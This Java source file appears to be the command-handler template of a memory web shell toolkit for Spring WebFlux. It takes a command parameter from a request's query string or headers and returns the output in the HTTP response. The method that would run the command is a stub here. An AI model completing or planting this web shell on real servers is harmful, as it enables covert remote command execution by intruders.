package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.http.ResponseEntity;
import org.springframework.web.server.ServerWebExchange;

import java.io.InputStream;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class CommandHandlerMethod {
    public static String paramName;

    public ResponseEntity<?> invoke(ServerWebExchange exchange) {
        String p = exchange.getRequest().getQueryParams().getFirst(paramName);
        if (p == null || p.isEmpty()) {
            p = exchange.getRequest().getHeaders().getFirst(paramName);
        }
        String result = "";
        try {
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                result = new Scanner(inputStream).useDelimiter("\\A").next();
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return ResponseEntity.ok(result);
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
